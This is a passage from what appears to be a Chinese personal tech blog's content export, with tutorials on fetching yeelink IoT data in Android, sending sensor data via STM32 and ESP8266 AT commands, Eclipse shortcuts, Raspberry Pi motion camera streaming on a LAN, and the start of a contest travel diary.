Auto-generated method stub</span></div><div class="line">                String response = <span class="keyword">new</span> String(bytes);</div><div class="line">                Message msg = <span class="keyword">new</span> Message();</div><div class="line">                msg.obj = response; </div><div class="line">                <span class="comment">//请求成功后，将返回值通过消息传递到Activity实现数据显示</span></div><div class="line">                handler.sendMessage(msg);  </div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(<span class="keyword">int</span> i, Header[] headers, <span class="keyword">byte</span>[] bytes,</span></span></div><div class="line">                    Throwable throwable) &#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                String response = <span class="keyword">new</span> String(bytes);</div><div class="line">                 <span class="comment">//请求不成功时将错误信息打印</span></div><div class="line">                System.out.println(response);  </div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="获取云端数据"><a href="#获取云端数据" class="headerlink" title="获取云端数据"></a>获取云端数据</h4><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">ActionBarActivity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> TextView tv_clound_data;</div><div class="line">    <span class="keyword">private</span> Button btn_get_data;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> Handler cloudHandler = <span class="keyword">new</span> Handler() &#123;</div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(android.os.Message msg)</span> </span>&#123;</div><div class="line">            String jsonData = (String) msg.obj;</div><div class="line">            <span class="comment">//成功获取数据后，将数据显示在界面上</span></div><div class="line">            tv_clound_data.setText(jsonData);</div><div class="line">            <span class="comment">//还可以将获得的JSON数据进行解析，以便使用适配器将数据显示在列表等其他地方</span></div><div class="line">            JSONArray ja;</div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                ja = <span class="keyword">new</span> JSONArray(jsonData);</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ja.length(); i++) &#123;</div><div class="line">                    JSONObject js = ja.getJSONObject(i);</div><div class="line">                    String time = js.getString(<span class="string">"timestamp"</span>);</div><div class="line">                    String value = js.getString(<span class="string">"value"</span>);</div><div class="line">                    System.out.println(time + value);</div><div class="line">                &#125;</div><div class="line">            &#125; <span class="keyword">catch</span> (JSONException e) &#123;</div><div class="line">                <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">                e.printStackTrace();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line"></div><div class="line">        <span class="comment">//初始化控件</span></div><div class="line">        tv_clound_data = (TextView) findViewById(R.id.tv_clound_data);</div><div class="line">        btn_get_data = (Button) findViewById(R.id.btn_get_data);</div><div class="line"></div><div class="line">        <span class="comment">//设置按钮监听事件</span></div><div class="line">        btn_get_data.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</div><div class="line"></div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                </div><div class="line">                <span class="comment">//不带参数的请求</span></div><div class="line">                <span class="comment">//String url = "http://api.yeelink.net/v1.0/device/你的设备号/sensor/你的传感器号/datapoint";</span></div><div class="line">                <span class="comment">//带参数的请求</span></div><div class="line">                String url = <span class="string">"http://api.yeelink.net/v1.0/device/你的设备号/sensor/你的传感器号.json?start=2016-05-01T14:01:46&amp;end=2016-06-24T10:01:40&amp;interval=1"</span>;</div><div class="line">                <span class="comment">//发送http请求</span></div><div class="line">                CloudHttpUtil.GetCloudData(cloudHandler, url);</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="测试效果图"><a href="#测试效果图" class="headerlink" title="测试效果图"></a>测试效果图</h4><h5 id="不带参数的请求"><a href="#不带参数的请求" class="headerlink" title="不带参数的请求"></a>不带参数的请求</h5><p>　　不带参数时将返回最新一个数据点的数据：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/28-2.jpg" alt="28-2"></p>
<h5 id="带参数的请求"><a href="#带参数的请求" class="headerlink" title="带参数的请求"></a>带参数的请求</h5><p>　　带参数时将返回参数指定时间段内的数据：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/28-3.jpg" alt="28-3"></p>
<p>　　注：你的云端传感器得有数据才能获取啊，没有数据的话可以在 yeelink 官网手动添加几个数据，他的 API 文档中编辑数据，然后有个在线调试，可以模拟 Http 请求进行数据点的创建。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>yeelink</tag>
      </tags>
  </entry>
  <entry>
    <title>单片机+ESP8266 上传数据到 yeelink</title>
    <url>/2016/06/29/%E5%8D%95%E7%89%87%E6%9C%BA+ESP8266%20%E4%B8%8A%E4%BC%A0%E6%95%B0%E6%8D%AE%E5%88%B0%20yeelink/</url>
    <content><![CDATA[<p>　　前段时间在做一个物联网的项目，需要将采集到的数据通过 STM32 单片机传送到 yeelink 云端，虽然之前学过 51 单片机但是因为 ESP8266 也是第一次使用，而且 STM32 没学过，对底层操作通信协议也不清楚，所以调试了很才成功了，现在有时间就把之前的思路理顺一下，希望对初学者有帮助。</p>
<a id="more"></a>
<h4 id="串口直接调试"><a href="#串口直接调试" class="headerlink" title="串口直接调试"></a>串口直接调试</h4><p>　　一开始是直接和项目成员一起通过 STM32 的串口发送命令来控制 ESP8266 进行数据发送，但是一直没成功，也不知道哪里出错了，也是想到可以直接将 ESP8266 通过单片机的转串口模块连接到电脑，用电脑的串口助手直接发命令给 ESP8266 进行调试，这样调试成功之后再把 STM32 加进来就容易多啦。</p>
<h5 id="熟悉操作命令"><a href="#熟悉操作命令" class="headerlink" title="熟悉操作命令"></a>熟悉操作命令</h5><p>　　查阅 ESP8266 的相关资料，以及 yeelink 的 http 请求格式，将命令准备在串口调试助手，如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/28-4.png" alt="28-4"></p>
<p>　　<strong>注意：选择发送新行，这样串口助手将自动在每一行后面加上回车换行符，具体原因在后面解释。然后在http请求头最后要发送一个空行，在发送请求体，即数据。否则数据上传失败。*</strong></p>
<h5 id="硬件连接与设置"><a href="#硬件连接与设置" class="headerlink" title="硬件连接与设置"></a>硬件连接与设置</h5><p>　　此处需要借助一个 USB 转串口的模块，也可以直接用单片机开发板上的转串口模块，将 ESP8266 的 Txd，Rxd引脚与单片机开发板的串口输出引脚反接(即 Txd 连 Rxd，Rxd 连 Txd)，将 Vcc 接单片机开发板的 Vcc 或 5V，GND接开发板的 GND，然后在电脑上设置串口调试助手波特率为：11520，再按顺序一条一条的发送以下命令，每条命令都会有相应的回应：</p>
<h5 id="ESP8266控制指令"><a href="#ESP8266控制指令" class="headerlink" title="ESP8266控制指令"></a>ESP8266控制指令</h5><ol>
<li>设置WIFI模式</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">AT+CWMODE=1</div></pre></td></tr></table></figure>
<ol>
<li>重启生效</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">AT+RST</div></pre></td></tr></table></figure>
<ol>
<li>连接无线路由器</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">AT+CWJAP=&quot;你的wifi账号&quot;,&quot;你的wifi密码&quot;</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/28-5.png" alt="28-5"></p>
<ol>
<li>查询模块 IP</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">AT+CIFSR</div></pre></td></tr></table></figure>
<ol>
<li>与服务器建立 TCP 连接</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">AT+CIPSTART=&quot;TCP&quot;,&quot;www.yeelink.net&quot;,80</div></pre></td></tr></table></figure>
<ol>
<li>开启透传模式</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">AT+CIPMODE=1</div></pre></td></tr></table></figure>
<ol>
<li>开始透传</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">AT+CIPSEND</div></pre></td></tr></table></figure>
<p>　　开始透传之后串口助手将显示 <code>‘&gt;’</code> 符号，已经开启透传模式，表示可以传输数据，如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/28-6.png" alt="28-6"></p>
<h5 id="Http请求格式"><a href="#Http请求格式" class="headerlink" title="Http请求格式"></a>Http请求格式</h5><p>　　Http 请求的格式可以参照 yeelink 的 API 文档中的在线调试，如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/28-7.png" alt="28-7"></p>
<p>　　在线调试发送 Http 请求之后下面会显示发送 Http 请求的格式，可直接复制过来用。</p>
<p>　　<strong>进入透传模式之后开始发送http请求获取数据，将以下8条命令一次发送完成，按顺序将命令一个个点击发送完，不要点一个等一下，这个必须将所有命令发送完才会有回应</strong></p>
<ol>
<li><code>POST /v1.0/device/你的设备号/sensor/你的传感器号/datapoints HTTP/1.1</code></li>
<li><code>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:9.0.1) Gecko/20100101 Firefox/9.0.1</code></li>
<li><code>Host: api.yeelink.net</code></li>
<li><p><code>Accept: */*</code></p>
</li>
<li><p><code>Content-Length: 15</code></p>
</li>
<li><p><code>U-ApiKey: 这里填写你在yeelink申请的密钥</code></p>
</li>
<li><p><code>发送一个空行</code></p>
</li>
<li><p><code>{&quot;value&quot;:34.66}</code></p>
</li>
</ol>
<p>　　发送成功将获得服务器的 200，OK 返回。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/28-8.png" alt="28-8"></p>
<p>　　其实，在这个过程中也遇到了很多坑：</p>
<ol>
<li><p>本来每发一条命令之后都要加上回车换行表示结束的，一开始没注意串口助手已经勾选发送新行，即自动为每一行添加回车换行，于是每条命令之后都有两个回车换行，就悲剧了。一定要注意你是否勾选上串口调试助手的回车换行。</p>
</li>
<li><p>建议大家还是勾选上串口调试助手的发送新行，一方面不用自己去写回车换行符，另一方面也省去了考虑加转义字符的麻烦。亲测，串口助手还不一定可以识别你自己写的回车换行符。</p>
</li>
<li><p>Http 请求一定是一次性发送完才会有响应，否则服务器无法判断你的请求是否发送完。</p>
</li>
</ol>
<h4 id="单片机控制ESP8266"><a href="#单片机控制ESP8266" class="headerlink" title="单片机控制ESP8266"></a>单片机控制ESP8266</h4><p>　　以上的测试成功以后，应该怎么发送命令，怎么发送 Http 请求就已经很清楚了，将这些命令和请求嵌入到 STM32 的代码中，然后用 STM32 的串口通过 printf 函数进行输出，便可以很方便的实现我们需要的功能。当然，此时需要注意为每一行命令加上回车换行符，以及转义字符的处理。</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line"></div><div class="line">//串口3,printf 函数</div><div class="line">//确保一次发送数据不超过USART3_MAX_SEND_LEN字节</div><div class="line">void u3_printf(char* fmt,...)  </div><div class="line">&#123;  </div><div class="line">    u16 i,j; </div><div class="line">    va_list ap; </div><div class="line">    va_start(ap,fmt);</div><div class="line">    vsprintf((char*)USART3_TX_BUF,fmt,ap);</div><div class="line">    va_end(ap);</div><div class="line">    i=strlen((const char*)USART3_TX_BUF);       //此次发送数据的长度</div><div class="line">    for(j=0;j&lt;i;j++)                            //循环发送数据</div><div class="line">    &#123;</div><div class="line">      //循环发送,直到发送完毕   </div><div class="line">      while(USART_GetFlagStatus(USART3,USART_FLAG_TC)==RESET);    </div><div class="line">      USART_SendData(USART3,USART3_TX_BUF[j]); </div><div class="line">    &#125; </div><div class="line">&#125;</div><div class="line"></div><div class="line">/*ESP8266连接网络与发送Http请求的部分代码*/</div><div class="line"></div><div class="line">//设置WIFI模式</div><div class="line">u3_printf("AT+CWMODE=1\r\n");</div><div class="line">delay_ms(1000);</div><div class="line"></div><div class="line">//重启生效</div><div class="line">u3_printf("AT+RST\r\n");</div><div class="line">delay_ms(1000);</div><div class="line"></div><div class="line">//连接无线路由器，需延时等待连接成功</div><div class="line">u3_printf("AT+CWJAP=\"你的wifi账号\",\"你的wifi密码\"\r\n");    </div><div class="line">delay_ms(1000);</div><div class="line">delay_ms(1000);</div><div class="line">delay_ms(1000);</div><div class="line">delay_ms(1000);</div><div class="line">delay_ms(1000);</div><div class="line">delay_ms(1000);</div><div class="line"></div><div class="line">//此处省略了查看ip地址</div><div class="line"></div><div class="line">//与服务器建立TCP连接</div><div class="line">u3_printf("AT+CIPSTART=\"TCP\",\"www.yeelink.net\",80\r\n");</div><div class="line">delay_ms(1000);</div><div class="line">delay_ms(1000);</div><div class="line"></div><div class="line">//开启透传模式</div><div class="line">u3_printf("AT+CIPMODE=1\r\n");</div><div class="line">delay_ms(1000);</div><div class="line"></div><div class="line">//开始透传</div><div class="line">u3_printf("AT+CIPSEND\r\n");</div><div class="line">delay_ms(10);</div><div class="line"></div><div class="line">//开始发生Http请求</div><div class="line">u3_printf("POST /v1.0/device/你的设备号/sensor/你的传感器号/datapoints HTTP/1.1\r\n");</div><div class="line">u3_printf("Host: api.yeelink.net\r\n");</div><div class="line">u3_printf("Accept: */*\r\n");</div><div class="line">u3_printf("U-ApiKey: 你在yeelink申请的密钥\r\n");</div><div class="line">u3_printf("Content-Length: 15\r\n");</div><div class="line">//设置短连接，连接双方都会要求在处理请求后关闭它们的TCP连接</div><div class="line">u3_printf("Connection: close\r\n");</div><div class="line">u3_printf("\r\n"); </div><div class="line">//发送数据</div><div class="line">u3_printf("&#123;\"value\":34.66&#125;); </div><div class="line">delay_ms(1000);</div><div class="line"></div><div class="line">//关闭透传</div><div class="line">u3_printf("+++");</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Embedded system</category>
      </categories>
      <tags>
        <tag>yeelink</tag>
        <tag>IoT</tag>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 开发之 eclipse 快捷操作</title>
    <url>/2016/06/18/Android%20%E5%BC%80%E5%8F%91%E4%B9%8B%20eclipse%20%E5%BF%AB%E6%8D%B7%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>　　本文总结了一些 eclipse 常用的快捷键以及快捷操作的小技巧，熟悉使用这些操作对于提高开发效率将会很有帮助。</p>
<a id="more"></a>
<h4 id="快速注释"><a href="#快速注释" class="headerlink" title="快速注释"></a>快速注释</h4><p><strong>（1）行注释：</strong> <code>ctrl+/</code></p>
<p><strong>（2）取消行注释：</strong> <code>再按一次ctrl+/</code></p>
<p><strong>（3）块注释:</strong> <code>ctrl+shift+/</code></p>
<p><strong>（4）取消块注释：</strong> <code>ctrl+shift+\</code></p>
<h4 id="快速编辑"><a href="#快速编辑" class="headerlink" title="快速编辑"></a>快速编辑</h4><p><strong>（1）快速删除当前行：</strong> <code>ctrl+D</code></p>
<p><strong>（2）代码编辑窗口缩放：</strong> <code>ctrl+M</code>，再按一次则可以恢复</p>
<p><strong>（3）快速切换代码编辑窗口：</strong> <code>ctrl+F6</code></p>
<p><strong>（4）大小写切换：</strong></p>
<ul>
<li><p><code>Ctrl+Shift+Y</code>  大写变小写</p>
</li>
<li><p><code>Ctrl+Shift+X</code>  小写变大写</p>
</li>
</ul>
<p><strong>（5）复制行：</strong></p>
<ul>
<li><p><code>Ctrl+Alt+向上</code>  复制当前行到上一行</p>
</li>
<li><p><code>Ctrl+Alt+向下</code>  复制当前行到下一行</p>
</li>
</ul>
<p><strong>（6）移动行：</strong></p>
<ul>
<li><p>Alt+向下   快速提取某行到下边指定位置</p>
</li>
<li><p>Alt+向上   快速提取某行到上边指定位置</p>
</li>
</ul>
<p><strong>（7）下一个错误及快速修改：</strong> <code>Ctrl+.</code> 及 <code>Ctrl+1</code></p>
<p><strong>（8）快速跳转到申明：</strong> <code>F3</code></p>
<p><strong>（9）重命名：</strong> <code>F2</code></p>
<p><strong>（10）回到最后一次编辑的地方：</strong> <code>Ctrl+Q</code></p>
<p><strong>（11）快速查看当前类的方法或某个特定方法：</strong> <code>Ctrl+O</code></p>
<p><strong>（12）配置行号：</strong></p>
<p>　　点击菜单栏的 <code>Windows—&gt;preference—&gt;General—&gt;Editors—&gt;Text Editors</code> 将 <code>show line numbers</code> 选上</p>
<p><strong>（13）增强代码提示功能：</strong></p>
<p>　　点击菜单栏的 <code>Windows—&gt;preference—&gt;Java—&gt;Editors—&gt;Content Assist</code> 将 <code>Auto activation atriggers for java</code> 后面的 <code>“.”</code> 换成 <code>“abcdefghijklmnopqrstuvwxyz.”</code></p>
<h4 id="快速生成"><a href="#快速生成" class="headerlink" title="快速生成"></a>快速生成</h4><p><strong>（1）快速复写超类的方法：</strong></p>
<p>　　点击 <code>右键—&gt;source—&gt;Generate Constructors from Superclass</code></p>
<p><strong>（2）批量生成get、set方法：</strong></p>
<p>　　点击 <code>右键—&gt;source—&gt;Generate Getters and Setters</code></p>
<p><strong>（3）快速生成构造方法：</strong></p>
<p>　　点击 <code>右键—&gt;source—&gt;Generate Constructor using Fields</code></p>
<p><strong>（4）使用代码模板（需选中代码）：</strong> <code>Alt+Shift+Z</code></p>
<p><strong>（5）快速导入包：</strong> <code>Ctrl+Shift+O</code></p>
<p><strong>（5）快速添加javadoc注释：</strong> <code>Ctrl+Shift+J</code>    </p>
<h4 id="美化代码"><a href="#美化代码" class="headerlink" title="美化代码"></a>美化代码</h4><p><strong>（1）快速格式化代码：</strong> <code>Ctrl+Shift+F</code></p>
<p><strong>（2）成员排序：</strong></p>
<p>　　选择 <code>菜单栏source—&gt;Sort Members</code>，使变量名、方法名或者类名按首字母大小排序</p>
<p><strong>（3）整理导入的包：</strong></p>
<p>　　选择 <code>菜单栏Source—&gt;Organize Imports</code> 或者使用 <code>Ctrl+Shift+O</code>，可以快速导入缺少的包以及删除不需要的包。</p>
<h4 id="代码重构-Refactor"><a href="#代码重构-Refactor" class="headerlink" title="代码重构(Refactor)"></a>代码重构(Refactor)</h4><p>　　快速打开Refactor菜单：Alt+shift+T</p>
<p><strong>（1）Rename</strong></p>
<p>　　选中变量或者方法名等需要更改的名字，点击菜单栏 <code>Refactor——&gt;Rename</code>（或者使用快捷键 <code>alt+shift+R</code>）即可实现代码中某一变量、方法或者类名进行全部重命名替换</p>
<p><strong>（2）Move</strong></p>
<p>　　点击菜单栏 <code>Refactor—&gt;Move</code>（或者使用快捷键 <code>alt+shift+V</code>），将该java文件移动到其他的包</p>
<p><strong>（3）修改方法结构</strong></p>
<p>　　点击菜单栏 <code>Refactor—&gt;Change Method Signature</code>（或者使用快捷键 <code>alt+shift+C</code>），不管有多少个函数调用了这个方法，修改一次就能全部搞定</p>
<p><strong>（4）抽取方法</strong> </p>
<p>　　选中需要单独生成方法的代码，点击菜单栏（或者右键）<code>Refactor—&gt;Extract Method</code>（或者使用快捷键<code>alt+shift+M</code>）,这是重构里面最常用的方法之一</p>
<p><strong>（5）抽取本地变量</strong></p>
<p>　　选中数字或字符串，点击菜单栏（或者右键）<code>Refactor—&gt;Extract Local Variable</code>（或者使用快捷键 <code>alt+shift+L</code>）， 可以直接把数字和字符串抽取成一个变量</p>
<p><strong>（6）撤销重构：</strong> <code>alt+shift+Z</code> 或者 <code>ctrl+Z</code></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>eclipse</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派 + motion 实现局域网简单监控</title>
    <url>/2016/06/14/%E6%A0%91%E8%8E%93%E6%B4%BE%20+%20motion%E5%AE%9E%E7%8E%B0%E5%B1%80%E5%9F%9F%E7%BD%91%E7%AE%80%E5%8D%95%E7%9B%91%E6%8E%A7/</url>
    <content><![CDATA[<h4 id="检查USB摄像头"><a href="#检查USB摄像头" class="headerlink" title="检查USB摄像头"></a>检查USB摄像头</h4><p>　　主要检查摄像头是否被树莓派检测到（同博主上一篇树莓派的博客：<a href="http://fanzhenyu.me/2016/06/10/%E6%A0%91%E8%8E%93%E6%B4%BE-USB%E6%91%84%E5%83%8F%E5%A4%B4-yeelink%E5%AE%9E%E7%8E%B0%E4%BA%91%E7%9B%91%E6%8E%A7/" target="_blank" rel="external">树莓派+USB摄像头+yeelink实现云监控</a>）</p>
<a id="more"></a>
<p>　　如果没有你的摄像头的信息，那么有可能你的树莓派的电源无法供应足够的电力给你的摄像头。这时你可以给你的摄像头用独立的电源线，比如有源 USB hub，并重新输入 lsusb 命令查看。如果摄像头还是不能被识别，我们只有建议你购买其他树莓派支持的摄像头了。</p>
<h4 id="配置motion"><a href="#配置motion" class="headerlink" title="配置motion"></a>配置motion</h4><p>　　<strong>注意：本文以Raspbian系统为例</strong></p>
<h5 id="安装motion"><a href="#安装motion" class="headerlink" title="安装motion"></a>安装motion</h5><p>　　输入命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">sudo apt-get install motion</div></pre></td></tr></table></figure>
<h5 id="配置motion-daemon-守护进程"><a href="#配置motion-daemon-守护进程" class="headerlink" title="配置motion daemon 守护进程"></a>配置motion daemon 守护进程</h5><p>　　输入命令编辑 motion：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">sudo nano /etc/default/motion</div></pre></td></tr></table></figure>
<p>　　把里面的 no 修改成 yes，让他可以一直在后台运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">start_motion_daemon=yes</div></pre></td></tr></table></figure>
<h5 id="修改motion的配置文件"><a href="#修改motion的配置文件" class="headerlink" title="修改motion的配置文件"></a>修改motion的配置文件</h5><p>（1）输入命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">sudo vim /etc/motion/motion.conf</div></pre></td></tr></table></figure>
<p>（2）修改配置文件</p>
<p>　　将第 11 行的 daemon off 改成 daemon on，如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/14-1.jpg" alt="14-1"></p>
<p>　　该文件很长，需要一直往下翻，直到 464 行你才看到端口号 8081，我们通过这个端口来读取视频数据，这里无需修改！如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/14-2.jpg" alt="14-2"></p>
<p>　　然后到第 477 行将 stream_localhost on 改成 off，即关闭 localhost 的限制，如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/14-3.jpg" alt="14-3"></p>
<p>　　当然，你也可以设定图片的分辨率，在第 90 行进行修改：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/14-4.jpg" alt="14-4"></p>
<p>　　最后，vim 编辑器下按 esc 然后输入：wq，即保存退出。</p>
<h5 id="配置启动"><a href="#配置启动" class="headerlink" title="配置启动"></a>配置启动</h5><p>（1）输入下面命令启动服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo service motion start</span></div></pre></td></tr></table></figure>
<p>（2）输入以下命令开启motion：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo motion</span></div></pre></td></tr></table></figure>
<h5 id="查看效果"><a href="#查看效果" class="headerlink" title="查看效果"></a>查看效果</h5><p>　　打开浏览器，输入 <code>http://树莓派IP:8081</code> 即可查看拍到的图像，如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/14-5.jpg" alt="14-5"></p>
<h4 id="需要注意的问题"><a href="#需要注意的问题" class="headerlink" title="需要注意的问题"></a>需要注意的问题</h4><h5 id="浏览器的问题"><a href="#浏览器的问题" class="headerlink" title="浏览器的问题"></a>浏览器的问题</h5><p>　　经过测试，Google 浏览器和火狐浏览器可以访问到图像，IE、Microsoft Edge 和 360 都不显示图像，而是提示下载，一直下载，其他的没有测试。</p>
<h5 id="局域网限制"><a href="#局域网限制" class="headerlink" title="局域网限制"></a>局域网限制</h5><p>　　之前看到别人的教程写的是外网也可以访问，实际上如果你没有配置你的树莓派成为服务器的话，你的树莓派的 ip 地址都是私有地址，外网无法访问，只能在局域网内部使用。</p>
<h5 id="摄像头的问题"><a href="#摄像头的问题" class="headerlink" title="摄像头的问题"></a>摄像头的问题</h5><p>　　树莓派供电不足也会影响视频质量，就像我上面的视频不是很清楚，我是直接用笔记本的 USB 供电的，一般来说笔记本 USB 口电流一般为 500mA，所以如果需要视频清晰的话建议使用移动电源进行供电，或者使用有源 USB hub。</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>Raspberry Pi</tag>
        <tag>motion</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝桥杯决赛之行 - 北京</title>
    <url>/2016/06/10/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%86%B3%E8%B5%9B%E4%B9%8B%E8%A1%8C%20-%20%E5%8C%97%E4%BA%AC/</url>
    <content><![CDATA[<p>　　端午节都过去了，和室友出去浪了一天，回来已经很累了，但是突然想到这一篇博客还没有写完，从北京回来也将近10天了，我估计如果再不写以后就不会写了。这段时间断断续续写了一点，但是写着写着又觉得自己在记流水账，然后就不想写下去了，感觉写作能力是越来越差了。但是，我觉得这一篇我必须得完成它，毕竟这次去北京参加蓝桥杯决赛自己收获很多，也有很多可以讲述的故事，这样的总结不管是对自己来说还是对看这篇博客的人来说都会有意义。有兴趣就听我唠叨唠叨吧~</p>
<a id="more"></a> 
<p>　　5月26日晚，怀着对帝都的期待与蓝桥杯决赛的担忧踏上了去往北京的火车。还好是卧铺，睡一晚就可以到北京。蓝桥杯决赛，其实并没有准备多久。现在想起来原因很多，忙碌的五月，似乎好多计划都被打乱，因为软考，因为期中考，还因为很多要去争取的东西，准备比赛的心思也没有了，省赛时大家一起备赛的氛围也没了，实验室被做毕业设计的学长学姐霸占，自己只能在寝室写写代码，积极性并不高。所以，只在最后几天好好复习了一下基本的模块，然后准备了一些资料到火车上看，但是因为是和其他实验室的小伙伴一起去，所以并不好自己一个人看代码，而是听带队老师讲讲故事，和他们一起玩玩，熄灯后就各自睡了，并没有做任何的复习。</p>
<p>　　5月27日早，到达北京西站，指导老师已经提前订好房间，我们准备坐地铁去住的地方，在地铁站，10几条地铁线路将北京完全覆盖，早高峰地铁排队的场景让我感叹大城市的不易。很幸运的是出了地铁站便看到北京展览馆，而且正好第二十届中国国际软件博览会，指导老师提议要去看一看，领了免费的入场券，然后回宾馆放行李，休整了一会就去看博览会了。</p>
<p>　　不愧是中国国际软件博览会，我国的各个省都有展区，还有韩国日本的展区。比较大的馆主要还是北上广、成都、南京这些地方的，毕竟产业链比较完善。很多互联网公司都展示了他们的产品，也提供了很多宣传资料。在这次博览会中，我们不仅看到了很多新的科技产品，比如能和人对话的机器人、VR眼镜、无人机等，而且还看到了自己之前了解过的一些项目，之前想过用树莓派去做停车场管理系统，因为在国内树莓派的资源相对较少，而比较成功的例子恰好是北邮的几个学生做的基于树莓派和微信的停车场视频监控系统，在这次展览中也看到好几家公司都有在做停车场管理系统，只是侧重的方面不太相同，也和展台的工作人员有过交流，都还做得比较成功。也看到了做农产品电商的公司，之前自己也弄过一个掌上农资宝的项目，想着去做一个卖农资的安卓App，当时因为自己才刚刚开始学安卓，所以也只是参加了两个比赛，并没有真正去做。在广州馆看到了机智云，一家做物联网云平台的公司，之前根本不知道，因为自己一直用的青岛的一家物联网云平台：yeelink，觉得还挺不错的，这次的发现又让我多了一个选择。在香港馆看到了做儿童编程玩具的，与工作人员交流之中了解到，他们的产品就是用的esp8266无线模块连接手机来进行控制，因为实验室也有这个模块，所以觉得这个东西还挺不错的，值得以后去玩一下。还在安徽馆看到了科大讯飞的展台，因为之前用过科大讯飞的语音SDK，所以感觉很熟悉。总之，这次博览会让我对这个行业有了更多的了解，通过与工作人员交流，我对于这些技术也有了新的认识，也开阔了视野。有些技术能力可能我们已经具备了，只是缺少创新的思想，没有去尝试。</p>
